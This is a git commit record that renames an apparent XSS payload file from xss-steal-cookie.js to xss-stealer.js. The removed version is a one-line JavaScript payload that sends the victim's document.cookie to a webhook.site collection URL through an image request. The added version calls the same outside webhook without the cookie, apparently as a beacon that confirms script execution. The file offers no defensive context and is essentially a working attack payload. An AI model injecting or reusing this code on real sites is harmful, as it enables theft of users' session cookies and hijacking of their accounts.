0aae998bf9a1d072a14c58b790c84890e0afc372
dh4r4 <117583137+dh4r4@users.noreply.github.com>
2024-02-18 22:02:37 +0100

    Update and rename xss-steal-cookie.js to xss-stealer.js

--- xss-steal-cookie.js
+++
@@ -1,3 +0,0 @@
-
-
-var i=new Image;i.src="https://webhook.site/ffe2df7d-c25d-4e01-a827-ada8802933e6/?cookie=session%3a"+document.cookie;
---
+++ xss-stealer.js
@@ -0,0 +1,3 @@
+
+
+var i=new Image;i.src="https://webhook.site/ffe2df7d-c25d-4e01-a827-ada8802933e6/";
